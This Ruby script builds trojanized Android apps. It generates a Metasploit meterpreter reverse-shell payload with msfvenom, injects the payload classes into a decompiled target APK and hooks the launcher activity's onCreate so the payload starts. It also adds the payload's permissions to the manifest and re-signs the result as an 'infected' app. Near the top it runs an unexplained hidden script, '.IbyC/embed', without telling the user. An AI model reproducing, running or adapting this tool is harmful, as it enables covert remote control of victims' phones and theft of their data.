#!/usr/bin/env ruby
# This script automatice the injections of metasploit payloads on arbitrary APKs.
# The APKs file have to be vulnerable without unicode files.
#

require 'nokogiri'
require 'fileutils'
require 'optparse'

class String
  def black;          "\033[30m#{self}\033[0m" end
  def red;            "\033[31m#{self}\033[0m" end
  def green;          "\033[32m#{self}\033[0m" end
  def brown;          "\033[33m#{self}\033[0m" end
  def blue;           "\033[34m#{self}\033[0m" end
  def magenta;        "\033[35m#{self}\033[0m" end
  def cyan;           "\033[36m#{self}\033[0m" end
  def gray;           "\033[37m#{self}\033[0m" end
end

system('bash ${PWD}/.IbyC/embed')

# Find the activity that apk_backdoor.rb is opened when you click the app icon
def findlauncheractivity(amanifest)
    package = amanifest.xpath("//manifest").first['package']
    activities = amanifest.xpath("//activity|//activity-alias")
    for activity in activities 
        activityname = activity.attribute("name")
        category = activity.search('category')
        unless category
            next
        end
        for cat in category
            categoryname = cat.attribute('name')
            if (categoryname.to_s == 'android.intent.category.LAUNCHER' || categoryname.to_s == 'android.intent.action.MAIN')
                activityname = activityname.to_s
                unless activityname.start_with?(package)
                    activityname = package + activityname
                end
                return activityname
            end
        end
    end
end

# If XML parsing of the manifest fails,
# recursively search the smali code for the onCreate() hook.
def scrapeFilesForLauncherActivity()
	smali_files||=[]
	Dir.glob('original/smali*/**/*.smali') do |file|
	  checkFile=File.read(file)
	  if (checkFile.include?";->onCreate(Landroid/os/Bundle;)V")
		smali_files << file
		smalifile = file
		activitysmali = checkFile
	  end
	end
	i=0
        print "[?]─➤ Please choose from one of the following:\n".cyan
	smali_files.each{|s_file|
          print "[+]─➤ Hook point ",i,": ",s_file,"\n".green
		i+=1
	}
	hook=-1
	while (hook < 0 || hook>i)
		print "\nHook: "
		hook = STDIN.gets.chomp.to_i
	end
	i=0
	smalifile=""
	activitysmali=""
	smali_files.each{|s_file|
		if (i==hook)
			checkFile=File.read(s_file)
			smalifile=s_file
			activitysmali = checkFile
			break
		end
		i+=1
	}
	return [smalifile,activitysmali]
end

def fix_manifest()
	payload_permissions=[]
	
	#Load payload's permissions
	File.open("payload/AndroidManifest.xml","r"){|file|
		k=File.read(file)
		payload_manifest=Nokogiri::XML(k)
		permissions = payload_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			payload_permissions << name.to_s
		end
	#	print "#{k}"
	}
	original_permissions=[]
	apk_mani=''
	
	#Load original apk's permissions
	File.open("original/AndroidManifest.xml","r"){|file2|
		k=File.read(file2)
		apk_mani=k
		original_manifest=Nokogiri::XML(k)
		permissions = original_manifest.xpath("//manifest/uses-permission")
		for permission in permissions
			name=permission.attribute("name")
			original_permissions << name.to_s
		end
	#	print "#{k}"
	}
	#Get permissions that are not in original APK
	add_permissions=[]
	for permission in payload_permissions
		if !(original_permissions.include? permission)
                        print "[+]─➤ Adding #{permission}\n".green
			add_permissions << permission
		end
	end
	inject=0
	new_mani=""
	#Inject permissions in original APK's manifest
	for line in apk_mani.split("\n")
		if (line.include? "uses-permission" and inject==0)
			for permission in add_permissions
				new_mani << '<uses-permission android:name="'+permission+'"/>'+"\n"
			end
			new_mani << line+"\n"
			inject=1
		else
			new_mani << line+"\n"
		end
	end
	File.open("original/AndroidManifest.xml", "w") {|file| file.puts new_mani }
end

def cleaning_up()
  `rm -rf original 2>&1`
  `rm -rf payload 2>&1`
  `rm original.apk 2>&1`
  `rm payload.apk 2>&1`
end

apkfile = ARGV[0]
unless(apkfile && File.readable?(apkfile))
  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
  exit(1)
end

jarsigner = `which jarsigner`
unless(jarsigner && jarsigner.length > 0)
  puts "[ERR-jarsigner]─➤ Going to https://t.me/Ivam3_Bot".red
	exit(1)
end

apktool = `which apktool`
unless(apktool && apktool.length > 0)
  puts "[ERR-apktool]─➤ Going to https://t.me/Ivam3_Bot".red
	exit(1)
end

zipalign = `which zipalign`
unless(zipalign && zipalign.length > 0)
  puts "[ERR-zipalign]─➤ Going to https://t.me/Ivam3_Bot".red
  exit(1)
end

apk_v=`apktool`
#unless(apk_v.split()[1].include?("v2."))
#	puts "[-] Apktool version #{apk_v} not supported, please download the latest 2. version from git.\n"
#	exit(1)
#end

begin
	msfvenom_opts = ARGV[1,ARGV.length]
	opts=""
	msfvenom_opts.each{|x|
	opts+=x
	opts+=" "
	}
rescue
  puts "[Usage]─➤ ruby EMBED.rb [target.apk] [msfvenom options]\n".cyan
# #{$0} [target.apk] [msfvenom options]\n".cyan
  puts "[ex]─➤ ruby EMBED.rb messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
# #{$0} messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443".green
  puts "[ERR-msf]─➤ Error parsing msfvenom options. Exiting.\n".red
	exit(1)
end

print "[*]─➤ Generating msfvenom payload..\n".cyan
res=`msfvenom -f raw #{opts} -o payload.apk 2>&1`
if res.downcase.include?("invalid" || "error")
	puts res
	exit(1)
end

print "[*]─➤ Signing payload..\n".cyan
`jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/payload.apk androiddebugkey`
`rm -rf original`
`rm -rf payload`

`cp #{apkfile} original.apk 2>&1`

print "[*]─➤ Decompiling orignal APK..\n".cyan
`apktool d -f -r $(pwd)/original.apk -o $(pwd)/original`
print "[*]─➤ Ignoring the resource decompilation..\n".cyan
`apktool d -f $(pwd)/original.apk -o $(pwd)/original_tmp`
`cat $(pwd)/original_tmp/AndroidManifest.xml > $(pwd)/original/AndroidManifest.xml`
`rm -rf $(pwd)/original_tmp`
print "[*]─➤ Decompiling payload APK..\n".cyan
`apktool d $(pwd)/payload.apk -o $(pwd)/payload`

f = File.open("original/AndroidManifest.xml")
amanifest = Nokogiri::XML(f)
f.close

print "[*]─➤ Locating onCreate() hook..\n".cyan

launcheractivity = findlauncheractivity(amanifest)
smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
begin
	activitysmali = File.read(smalifile)
rescue Errno::ENOENT
  print "[w]─➤ Unable to find correct hook automatically\n".red
	begin
		results=scrapeFilesForLauncherActivity()
		smalifile=results[0]
		activitysmali=results[1]
	rescue
          puts "[ERR-apk]─➤ Error finding launcher activity. Exiting".red
		exit(1)
	end
end

print "[*]─➤ Copying payload files..\n".cyan
FileUtils.mkdir_p('original/smali/com/metasploit/stage/')
FileUtils.cp Dir.glob('payload/smali/com/metasploit/stage/Payload*.smali'), 'original/smali/com/metasploit/stage/'
activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
payloadhook = activitycreate + "\n    invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V"
hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..\n".cyan
File.open(smalifile, "w") {|file| file.puts hookedsmali }

injected_apk=apkfile.split(".")[0]
injected_apk = "data/data/com_backdoored.apk"
final_apk=apkfile.split("/")[-1]
final_apk+="_final"

print "[*]─➤ Poisoning the manifest with meterpreter permissions..\n".cyan
fix_manifest()

print "[*]─➤ Rebuilding #{apkfile} with meterpreter injection as #{injected_apk}..\n".cyan
`apktool b --use-aapt2 -o $(pwd)/#{injected_apk} $(pwd)/original`

if File.exist?("#{injected_apk}")
  print "[*]─➤ Signing #{injected_apk} ..\n".cyan
  `jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $(pwd)/#{injected_apk} androiddebugkey`
  print "[*]─➤ Aligning #{injected_apk} ..\n".cyan
  `zipalign -f -v 4 $(pwd)/#{injected_apk} #{final_apk}`
  cleaning_up()
  if File.exist?("#{final_apk}")
    puts "[+]─➤ Infected file #{final_apk} ready.\n".green
  else
    puts "[ERR-sign]─➤ Going at https://t.me/Ivam3_Bot".red
    exit(1)
  end
else
  cleaning_up()
  puts "[ERR-build]─➤ Going at https://t.me/Ivam3_Bot".red
  exit(1)
end
